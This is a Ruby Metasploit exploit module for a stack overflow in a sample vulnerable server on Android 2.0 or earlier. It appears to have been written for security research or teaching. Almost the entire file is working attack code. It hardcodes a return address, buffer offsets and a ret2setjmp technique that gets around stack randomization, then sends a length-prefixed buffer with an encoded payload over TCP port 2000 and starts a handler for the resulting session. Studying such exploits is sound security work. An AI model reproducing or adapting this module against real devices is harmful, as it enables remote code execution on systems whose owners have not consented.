#
#
# Custom metasploit exploit for sample vuln app Android
# Written by Eloi Sanfelix
#
#
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp
      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Custom vulnerable server stack overflow for Android',
                        'Description'    => %q{
                                        This module exploits a stack overflow in a
                                        custom vulnerable server for Android. Uses a 
					ret2setjmp technique to bypass stack randomization.
                                             },
                        'Author'         => [ 'esanfelix' , 'vierito5' ],
                        'Version'        => '$Revision: 1.0 $',
                        'Platform'       => 'linux',
			'Arch'		=> ARCH_ARMLE,

                        'Targets'        =>
                                [
                                        ['Android <= 2.0',
                                          { 'Ret' => 0xafe0ddf0, 'Offset' => 88 , 'Dest' => 0xb0014004, 'RegOffset' => 56 },
					]
                                ],
			'DefaultTarget' => 0,
			
                        'Privileged'     => false
                        ))

                        register_options(
                        [
                                Opt::RPORT(2000)
                        ], self.class)
       end

       def exploit
          connect
	  repeat = target['Offset']/4
	  junk = make_nops(target['Offset']-16) + "\x1d\xff\x2f\xe1"*4 
	  nops = make_nops(40*4) #NOPs to avoid payload destruction by vuln app
          sploit = junk + [target.ret].pack('V') + [target['Dest']].pack('V') + [target['Dest'] + target['RegOffset']].pack('V') +nops +payload.encoded
	  real_sploit = [sploit.length()].pack('V') + sploit
          sock.put(real_sploit)
          
          disconnect
	  handler
       end

end
